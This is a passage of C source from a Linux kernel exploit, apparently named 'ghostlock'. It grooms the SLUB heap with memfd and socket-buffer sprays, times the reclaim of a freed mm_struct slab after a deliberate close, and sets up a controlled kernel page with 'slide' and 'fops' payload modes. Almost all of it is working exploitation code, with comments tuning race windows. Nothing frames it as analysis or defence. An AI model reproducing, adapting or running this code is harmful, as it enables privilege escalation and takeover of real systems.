    post_ctx.memfds[i] = -1;
  }
  for (size_t i = 0; i < spray_ctx.mm_cnt; i += mm_objs_per_slab) {
    close(spray_ctx.memfds[i]);
    spray_ctx.memfds[i] = -1;
  }

  ghostlock_reclaim_batch_close(&shaping_batch);
  for (int i = 0; i < 4; i++) {
    sched_yield();
  }

  /*
   * Prepare allocator pressure while leak_memfd still pins the target
   * mm_struct.  The cache is merged into :A-0000896 on retail, so doing this
   * work after the final close leaves an avoidable window in which the empty
   * target slab can be reused before the marker drain.  Once leak_memfd is
   * closed, perform only the drain and held spray.
   */
  int prefill_ok = prefill_order0_buddy();
  int absorb_sent = send_order3_absorb(skb_buf, SKB_RECLAIM_SIZE);

  int teardown_ok = write_trace_control('1');
  snprintf(trace_note, sizeof(trace_note),
           "ghostlock leak-close-begin mm=%016zx", leaked);
  if (!write_reclaim_trace_marker(trace_note)) {
    teardown_ok = 0;
  }
  int perf_free_armed = 1;
  int perf_gate_errno = 0;
  if (ghostlock_perf_gate_enabled()) {
    perf_free_armed = ghostlock_perf_gate_begin_free();
    if (!perf_free_armed) {
      perf_gate_errno = errno;
      teardown_ok = 0;
    }
  }
  if (close(leak_memfd) != 0) {
    teardown_ok = 0;
  }
  leak_memfd = -1;
  snprintf(trace_note, sizeof(trace_note),
           "ghostlock leak-close-end mm=%016zx", leaked);
  if (!write_reclaim_trace_marker(trace_note)) {
    teardown_ok = 0;
  }

  /*
   * The leak slab is now empty but can still be frozen on this CPU's SLUB
   * cpu_partial list.  Free one marker from each prepared slab to force
   * unfreeze_partials(), then immediately issue the held spray.  Keep this
   * close-to-send window free of fresh socket setup, page prefilling, tracefs
   * opens, and mm_struct allocations.
   */
  struct ghostlock_marker_result marker_result;
  snprintf(trace_note, sizeof(trace_note),
           "ghostlock marker-drain-begin requested=%zu",
           prepare_ctx.mm_cnt / mm_objs_per_slab);
  if (!write_reclaim_trace_marker(trace_note)) {
    teardown_ok = 0;
  }
  int markers_ok = ghostlock_close_slab_markers(
      prepare_ctx.memfds, prepare_ctx.mm_cnt, mm_objs_per_slab,
      &marker_result);
  snprintf(trace_note, sizeof(trace_note),
           "ghostlock marker-drain-end closed=%zu requested=%zu",
           marker_result.closed, marker_result.requested);
  if (!write_reclaim_trace_marker(trace_note)) {
    teardown_ok = 0;
  }

  struct ghostlock_reclaim_result reclaim_result;
  memset(&reclaim_result, 0, sizeof(reclaim_result));
  size_t reclaim_send_target = ghostlock_perf_gate_enabled() ?
      SKB_PERF_GATE_RECLAIM_SENDS : GHOSTLOCK_RECLAIM_SENDS;
  reclaim_result.requested = reclaim_send_target;
  reclaim_result.failed_pair = -1;
  snprintf(trace_note, sizeof(trace_note),
           "ghostlock held-spray-begin requested=%zu",
           reclaim_send_target);
  if (!write_reclaim_trace_marker(trace_note)) {
    teardown_ok = 0;
  }
  int perf_alloc_armed = 1;
  if (ghostlock_perf_gate_enabled()) {
    perf_alloc_armed = perf_free_armed &&
        ghostlock_perf_gate_finish_free_begin_alloc();
    if (!perf_alloc_armed) {
      if (!perf_gate_errno) {
        perf_gate_errno = errno;
      }
      teardown_ok = 0;
    }
  }
  int reclaim_ok = 0;
  int perf_capture_seen = 0;
  if (perf_alloc_armed) {
    if (!ghostlock_perf_gate_enabled()) {
      reclaim_ok = ghostlock_reclaim_hold_all(
          &reclaim_batch, skb_buf, SKB_RECLAIM_SIZE,
          reclaim_send_target, &reclaim_result);
    } else {
      for (size_t send_index = 0; send_index < reclaim_send_target;
           ++send_index) {
        if (!ghostlock_reclaim_hold_one(
                &reclaim_batch, skb_buf, SKB_RECLAIM_SIZE)) {
          reclaim_result.first_errno = errno ? errno : EIO;
          reclaim_result.failed_pair =
              (int)(send_index % reclaim_batch.pair_count);
          break;
        }
        reclaim_result.sent++;
        reclaim_result.sent_per_pair[
            send_index % reclaim_batch.pair_count]++;

        if ((reclaim_result.sent % SKB_PERF_GATE_POLL_INTERVAL) == 0 ||
            reclaim_result.sent == reclaim_send_target) {
          int poll_result = ghostlock_perf_gate_poll_alloc();
          if (poll_result < 0) {
            reclaim_result.first_errno = errno ? errno : EIO;
            break;
          }
          if (poll_result > 0) {
            perf_capture_seen = 1;
            break;
          }
        }
      }
      reclaim_result.complete = perf_capture_seen;
      reclaim_ok = reclaim_result.complete;
      if (!reclaim_ok && reclaim_result.first_errno == 0)
        reclaim_result.first_errno = EAGAIN;
    }
  }
  int perf_capture_ok = 1;
  if (ghostlock_perf_gate_enabled()) {
    perf_capture_ok = perf_alloc_armed &&
        ghostlock_perf_gate_finish_alloc();
    if (!perf_capture_ok) {
      if (!perf_gate_errno) {
        perf_gate_errno = errno;
      }
      teardown_ok = 0;
    }
  }
  snprintf(trace_note, sizeof(trace_note),
           "ghostlock held-spray-end sent=%zu requested=%zu",
           reclaim_result.sent, reclaim_result.requested);
  if (!write_reclaim_trace_marker(trace_note)) {
    teardown_ok = 0;
  }
  if (!write_trace_control('0')) {
    teardown_ok = 0;
  }
  if (ghostlock_perf_gate_enabled()) {
    const struct ghostlock_perf_gate_result *perf_gate =
        ghostlock_perf_gate_result();
    pr_info("perf reclaim gate result verified=%d pfn=%llx "
            "memstart=%016llx free=%llu alloc=%llu candidates=%zu errno=%d\n",
            perf_gate->capture_verified,
            (unsigned long long)perf_gate->matched_pfn,
            (unsigned long long)perf_gate->matched_memstart,
            (unsigned long long)perf_gate->free_count,
            (unsigned long long)perf_gate->alloc_count,
            perf_gate->candidate_count, perf_gate_errno);
    for (size_t i = 0; i < perf_gate->candidate_count; ++i) {
      pr_info("perf reclaim candidate index=%zu pfn=%llx memstart=%016llx "
              "free=%llu\n",
              i,
              (unsigned long long)perf_gate->candidates[i].pfn,
              (unsigned long long)perf_gate->candidates[i].memstart,
              (unsigned long long)perf_gate->candidate_free_counts[i]);
    }
  }
  close_transient_reclaim_sockets();
  pr_info("mm skb reclaim sends=%zu/%zu pairs=%zu capture_seen=%d "
          "absorb=%d/%d "
          "buddy_guard=%d/%zu prefill=%d teardown=%d markers=%zu/%zu\n",
          reclaim_result.sent, reclaim_result.requested,
          reclaim_batch.pair_count, perf_capture_seen,
          absorb_sent, SKB_ABSORB_PAIRS * SKB_ABSORB_SENDS_PER_PAIR,
          buddy_guard_sent, pre_ctx.mm_cnt, prefill_ok, teardown_ok,
          marker_result.closed, marker_result.requested);

  kernelsnitch_cleanup(ks);
  ks = NULL;
  close_ctx_memfds(&prepare_ctx);
  if (!teardown_ok || !perf_capture_ok ||
      buddy_guard_sent != (int)pre_ctx.mm_cnt ||
      !prefill_ok || !markers_ok ||
      absorb_sent != SKB_ABSORB_PAIRS * SKB_ABSORB_SENDS_PER_PAIR ||
      !reclaim_ok ||
      (!ghostlock_perf_gate_enabled() &&
       reclaim_result.sent != reclaim_send_target)) {
    pr_warning("STAGE-E reclaim failed teardown=%d perf=%d perf_errno=%d "
               "buddy_guard=%d/%zu "
               "prefill=%d markers=%zu/%zu absorb=%d/%d sends=%zu/%zu "
               "errno=%d\n",
               teardown_ok, perf_capture_ok, perf_gate_errno,
               buddy_guard_sent,
               pre_ctx.mm_cnt, prefill_ok,
               marker_result.closed, marker_result.requested,
               absorb_sent,
               SKB_ABSORB_PAIRS * SKB_ABSORB_SENDS_PER_PAIR,
               reclaim_result.sent, reclaim_send_target,
               reclaim_result.first_errno);
    close_reclaim_sockets();
    cleanup_page_prepare_state();
    return 0;
  }
  return base;
}

uintptr_t prepare_good_kernel_page(int payload_mode) {
  int max_attempts = payload_mode == PAGE_PAYLOAD_SLIDE ?
      SLIDE_KERNEL_PAGE_SETUP_ATTEMPTS : FOPS_KERNEL_PAGE_SETUP_ATTEMPTS;
  for (int attempt = 1; attempt <= max_attempts; attempt++) {
    uintptr_t base = prepare_kernel_page(payload_mode);
    if (base) {
      return base;
    }
    pr_warning("kernel page retry %d/%d mode=%d\n",
               attempt, max_attempts, payload_mode);
  }
  return 0;
}

int is_kernel_ptr(uintptr_t value) {
  return value >= 0xffff800000000000ULL;
}

int is_direct_ptr(uintptr_t value) {
  return value >= DIRECT_MAP_BASE;
}
